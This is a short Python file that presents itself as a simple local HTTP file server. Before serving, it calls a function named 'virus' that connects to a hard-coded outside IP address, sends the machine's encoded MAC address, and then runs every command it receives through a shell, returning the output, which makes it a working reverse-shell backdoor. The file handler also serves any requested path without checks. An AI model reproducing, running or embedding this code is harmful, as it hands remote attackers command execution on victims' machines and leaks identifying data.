from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import subprocess as sp
import socket
import uuid
import base64

class Serv(BaseHTTPRequestHandler):

    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        try:
            file_to_open = open(self.path[1:]).read()
            self.send_response(200)
        except:
            file_to_open = "File not found"
            self.send_response(404)
        self.end_headers()
        self.wfile.write(bytes(file_to_open, 'utf-8'))

def virus():
    HOST = '44.202.184.56'    # The remote host
    PORT = 12000               # The same port as used by the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        a=hex(uuid.getnode())
        a = bytes(a, 'utf-8')
        a=base64.b64encode(a)
        s.sendall(a)
        while True:
            msg=s.recv(2048).decode('utf-8')
            output = sp.getoutput(msg)
            msg = bytes(output, 'utf-8')
            s.sendall(msg)

httpd = HTTPServer(('localhost', 8080), Serv)
virus()
httpd.serve_forever()
